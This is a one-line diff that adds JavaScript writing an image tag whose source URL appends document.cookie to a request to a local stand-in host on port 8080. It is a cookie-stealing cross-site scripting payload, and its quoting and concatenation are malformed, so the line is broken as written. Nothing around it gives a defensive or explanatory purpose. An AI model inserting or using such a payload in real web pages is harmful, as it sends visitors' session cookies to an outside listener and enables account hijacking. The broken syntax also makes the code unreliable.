@@ -1,0 +1,1 @@
+document.write("<img src='http://0.0.0.0:8080/?'+document.cookie+>")
